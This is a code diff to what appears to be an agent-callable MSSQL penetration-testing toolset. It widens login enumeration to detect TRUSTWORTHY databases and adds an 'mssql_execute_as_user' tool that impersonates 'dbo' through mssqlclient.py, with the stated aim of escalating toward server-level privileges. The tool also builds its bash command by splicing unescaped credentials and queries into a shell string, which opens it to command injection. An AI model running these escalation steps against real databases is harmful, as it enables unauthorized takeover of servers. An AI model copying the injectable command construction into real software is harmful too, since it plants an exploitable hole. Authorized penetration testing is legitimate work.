@@ -3797,7 +3797,12 @@ class MSSQLTools(Toolset):
             logger.info(f"[*] Testing MSSQL login to {target}")
             # Use a simple enumeration command - SQL is intentional for pentest tool
             # nosec B608 - intentional SQL for MSSQL pentest enumeration
-            sql_query = "SELECT name FROM master.sys.databases; SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+            sql_query = (
+                "SELECT name FROM master.sys.databases; "
+                "SELECT name, is_trustworthy_on FROM sys.databases; "
+                "SELECT * FROM fn_my_permissions(NULL, 'SERVER'); "
+                "SELECT * FROM fn_my_permissions(NULL, 'DATABASE');"
+            )
             enum_cmd = f"echo '{sql_query}' | mssqlclient.py {target_string}"
             if windows_auth:
                 enum_cmd += " -windows-auth"
@@ -3808,6 +3813,11 @@ class MSSQLTools(Toolset):
             if "impersonate" in result.lower() or "control server" in result.lower():
                 logger.warning("[!] IMPERSONATION or CONTROL SERVER permission found!")
                 result = "🚨 IMPERSONATION POSSIBLE - Use mssql_impersonate next!\n\n" + result
+            if "is_trustworthy_on" in result.lower() and "1" in result:
+                result = (
+                    "🚨 TRUSTWORTHY DATABASE DETECTED - Check DB-level impersonation:\n"
+                    "→ Use mssql_execute_as_user with impersonate_user='dbo'\n\n" + result
+                )
 
             return result
 
@@ -3876,6 +3886,67 @@ class MSSQLTools(Toolset):
 
         except Exception as e:
             return f"xp_cmdshell failed: {e}"
+
+    @dn.tool_method
+    def mssql_execute_as_user(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        query: str,
+        database: str | None = None,
+        domain: str | None = None,
+        windows_auth: bool = True,
+        impersonate_user: str = "dbo",
+    ) -> str:
+        """
+        Execute a query as a database principal (EXECUTE AS USER).
+
+        Use when database-level impersonation is possible, especially with
+        TRUSTWORTHY databases, to escalate toward server-level privileges.
+
+        Args:
+            target: MSSQL server IP
+            username: Username for authentication
+            password: Password for authentication
+            query: SQL query to execute as the impersonated user
+            database: Database name to run the query against (optional)
+            domain: Domain for Windows auth
+            windows_auth: Use Windows authentication
+            impersonate_user: Database principal to impersonate (default: dbo)
+
+        Returns:
+            Query output
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        sql_commands = []
+        if database:
+            sql_commands.append(f"USE [{database}];")
+        sql_commands.append(f"EXECUTE AS USER = '{impersonate_user}';")
+        sql_commands.append(query)
+        sql_commands.append("REVERT;")
+        sql_script = " ".join(sql_commands)
+
+        cmd_string = f'echo "{sql_script}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(
+                "[*] Executing query as %s on %s (db=%s)",
+                impersonate_user,
+                target,
+                database or "default",
+            )
+            stdout, stderr, _ = _run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"mssql_execute_as_user failed: {e}"
 
     @dn.tool_method
     def mssql_enum_linked_servers(
